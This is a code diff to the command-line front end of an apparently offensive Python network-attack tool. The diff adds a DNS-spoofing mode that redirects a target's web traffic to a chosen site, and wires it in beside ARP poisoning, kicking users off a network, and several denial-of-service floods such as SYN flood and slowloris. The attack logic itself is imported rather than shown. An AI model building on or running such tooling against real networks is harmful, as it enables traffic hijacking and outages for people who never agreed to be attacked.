@@ -2,7 +2,6 @@ import argparse
 import os, sys, time
 import logging
 logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
-
 try:
     import netifaces
     from scapy.all import *
@@ -10,7 +9,7 @@ except ImportError as e:
     print(str(e))
     print("Please install the required modules")
     sys.exit(1)
-
+    
 from lib.access import *
 from lib.kick import *
 from lib.DoS import *
@@ -44,7 +43,7 @@ def argument_parser():
     attacks = parser.add_argument_group("Attacks")
     recon = parser.add_argument_group("Reconnaissance")
     info = parser.add_argument_group("Information")
-    attacks.add_argument("-s", "--spoof", help="ARP", metavar='')
+    attacks.add_argument("-s", "--spoof", help="ARP, DNS", metavar='')
     info.add_argument("-t", "--target", help="Target to attack", metavar='')
     info.add_argument("-i", "--interface", help="Interface to use", metavar='')
     attacks.add_argument("-k", "--kick", help="Kick one/multiple/all people off your network", metavar='')
@@ -55,6 +54,7 @@ def argument_parser():
     info.add_argument("-p", "--port", help="Port to perform attack on", type=int, metavar='')
     info.add_argument("-S", "--sockets", help="Number of sockets to generate for slowloris attack (default=100)", type=int, metavar='')
     info.add_argument("-g", "--gateway", help="insert IP of gateway", metavar='')
+    info.add_argument("-w", "--website", help="Redirect traffic to specified website with DNS spoof", metavar='')
     return parser.parse_args()
 
 def check_args(args):
@@ -65,6 +65,20 @@ def check_args(args):
             gateway = gatewayIP()
         logging.debug(" Starting ARP poisoning on target: {1}{0}{2}".format(args.target, LRED, RST))
         arpattack(args.target, gateway)
+    if args.spoof == "DNS" and args.target and args.website:
+        logging.debug(" Starting DNS spoof on target: {1}{0}{2}{4} and redirecting traffic to: {1}{3}{2}".format(args.target, LRED, RST, args.website, RD))
+        if args.interface:
+            iface = args.interface
+        else:
+            iface = iface.interface().get_wlan()
+            if iface[1] == False:
+                iface = iface[0]
+            else:
+                logging.error(" Couldn't detect wireless interface or interface is in monitor mode, please specify by using -i <interface>")
+                sys.exit(1)
+        dnsspoof = DNSspoof(args.target, args.website, args.interface)
+        dnsspoof.website()
+        dnsspoof.sniffer()
     if args.kick == "one" and args.target:
         logging.debug(" Selected: kick one")
         kick = kickout(args.target)
@@ -101,19 +115,19 @@ def check_args(args):
         else:
             threads = args.threads
         logging.info(" Using {} threads".format(threads))
-        if dos == "fraggle":
+        if dos.lower() == "fraggle":
             logging.debug(" Selected fraggle attack")
             DOSthread(fraggle, tgt, threads)
-        elif dos == "GETflood":
+        elif dos.lower() == "getflood":
             logging.debug(" Selected GET flood attack")
             DOSthread(GETflood, tgt, threads)
-        elif dos == "slowloris":
+        elif dos.lower() == "slowloris":
             logging.debug(" Selected slowloris attack")
             slowloris(tgt, socks)
-        elif dos == "SYNflood":
+        elif dos.lower() == "synflood":
             logging.debug(" Selected SYN flood attack")
             DOSthread(synflood, tgt, threads, port=port)
-        elif dos == "pingflood":
+        elif dos.lower() == "pingflood":
             logging.debug(" Selected ping flood attack")
             DOSthread(pingflood, tgt, threads)
 
